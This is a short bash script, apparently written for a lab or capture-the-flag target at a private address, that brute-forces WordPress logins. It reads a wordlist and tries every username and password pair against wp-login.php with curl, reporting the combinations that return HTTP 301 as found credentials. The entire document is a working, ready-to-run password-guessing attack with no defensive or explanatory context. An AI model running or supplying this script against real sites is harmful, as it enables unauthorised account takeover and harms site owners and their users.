#!/bin/bash

readarray Array -t < dic_new

for login in "${Array[@]}";
do
    for password in "${Array[@]}";
do
        response_code=$(curl -s -o /dev/null -w "%{http_code}" -X POST -d "log=$login&pwd=$password&wp-submit=Log In" http://10.65.150.233/wp-login.php);
        if [[ "$response_code" == "301" ]]; then
            echo "Found credentials: $login:$password";
        fi
    done
done